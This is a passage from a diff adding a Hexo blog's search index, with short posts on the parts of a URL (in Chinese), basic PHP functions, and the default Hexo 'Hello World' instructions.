href="http://thecat.top/">http://thecat.top</a>:80&#x2F;cat&#x2F;index.phpuserID&#x3D;1&amp;passwordID&#x3D;123456#OK</p><p>1.协议部分：该url的协议部分为http:&#x2F;&#x2F;</p><p>2.域名部分：该url的域名为thecat.top，也可以用ip作为域名来使用。</p><p>3.端口部分：跟在域名后面为端口，端口和域名之间用：作为间隔。端口不是url的必须部分。</p><p>4.虚拟目录部分：从域名后第一个&#x2F;开始到最后一个&#x2F;位置为虚拟目录位置，虚拟目录也并不是一个url所必须的部分。</p><p>5.文件名部分：从域名后的最后一个&#x2F;开始到？为止，为文件名部分，如果没有？，则是从域名后的最后一个&#x2F;开始到#为止。如果没有？或者#则从域名最后的一个&#x2F;开始到结束都是文件名部分。文件名部分也不是一个url所必须的部分</p><p>6.锚部分：从#开始到最后都是锚部分，锚点表示资源中的一种“书签”，给浏览器显示位于该“加书签”位置的内容的方向。锚部分也不是url所必须的部分。</p><p>7.参数部分从？开始到#号为止的部分为参数部分，又称搜索部分，查询部分等。参数部分可以存在多个参数，之间用&amp;连接。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web basic </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> basic </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>first php</title>
+      <link href="/2023/11/15/day1/"/>
+      <url>/2023/11/15/day1/</url>
+      
+        <content type="html"><![CDATA[<p>is_string()：检测变量是否是字符串<br>isset()：检测变量是否已设置并且非 NULL<br>in_array(要搜索的值，要搜索的数组)：搜索数组中是否存在指定的值<br>mb_substr($page，n，m)：返回page中从第n位开始，到n+m位字符串的值<br>mb_strpos()：查找字符串在另一个字符串中首次出现的位置<br>urldecode()：将url编码后的字符串还原成未编码的样子</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> php </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> school </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/2023/11/12/hello-world/"/>
+      <url>/2023/11/12/hello-world/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>first</title>
+      <link href="/1970/01/01/first/"/>
+      <url>/1970/01/01/first/</url>
+      
+        <content type="html"><![CDATA[<p>this is first blog!</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> welcome </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> school </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
